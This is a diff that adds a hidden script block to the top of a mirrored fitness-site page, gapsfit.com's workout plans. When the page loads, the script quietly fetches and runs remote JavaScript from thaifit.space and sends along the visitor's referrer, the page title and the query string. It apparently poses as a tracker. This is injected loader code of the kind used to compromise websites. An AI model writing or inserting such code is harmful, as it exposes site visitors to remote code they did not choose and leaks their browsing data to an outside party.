@@ -1,3 +1,13 @@
+<span id="a9ea7e4c-241c-3da1-81c8-af94fc7289d6"></span><script type="application/javascript">
+var d=document;var s=d.createElement('script'); 
+s.src='https://thaifit.space/?qxD1pn&se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5e9efa0d7a663=script5e9efa0d7a664&_cid=a9ea7e4c-241c-3da1-81c8-af94fc7289d6'; 
+if (document.currentScript) { 
+document.currentScript.parentNode.insertBefore(s, document.currentScript);
+} else {
+d.getElementsByTagName('head')[0].appendChild(s);
+}
+if (document.location.protocol === 'https:' && 'https://thaifit.space/?qxD1pn&se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5e9efa0d7a663=script5e9efa0d7a664'.indexOf('http:') === 0 ) {alert('The website works on HTTPS. The tracker must use HTTPS too.');}
+</script>
 <!DOCTYPE html><html class="avada-html-layout-wide avada-html-header-position-top avada-is-100-percent-template" lang="en-US" prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb#">
 <!-- Mirrored from www.gapsfit.com/workout-plans/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 20 Apr 2020 19:20:13 GMT -->
 <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
